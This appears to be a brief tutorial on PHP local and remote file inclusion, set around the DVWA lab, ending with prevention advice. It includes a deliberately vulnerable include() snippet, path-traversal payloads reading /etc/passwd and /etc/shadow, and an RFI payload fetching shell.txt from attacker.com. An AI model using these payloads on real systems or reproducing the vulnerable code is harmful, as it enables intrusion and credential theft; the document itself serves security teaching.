# File Inclusion Attacks

File inclusion vulnerabilities allow attackers to include files from the server filesystem (LFI) or remote servers (RFI).

---

## Local File Inclusion (LFI)

LFI occurs when user input is used to include local files without proper validation.

### Vulnerable Code

```php
$page = $_GET['page'];
include($page . '.php');
```

### Reading Sensitive Files

```
?page=../../../../etc/passwd
?page=../../../../etc/shadow
```

### DVWA LFI Example

```
http://localhost/DVWA/vulnerabilities/fi/?page=../../../../etc/passwd
```

---

## Remote File Inclusion (RFI)

RFI allows including files from remote servers.

```
?page=http://attacker.com/shell.txt
```

---

## Prevention

- Whitelist allowed file names
- Disable allow_url_include in php.ini
- Use absolute paths with fixed base directory
- Run web server with minimal permissions
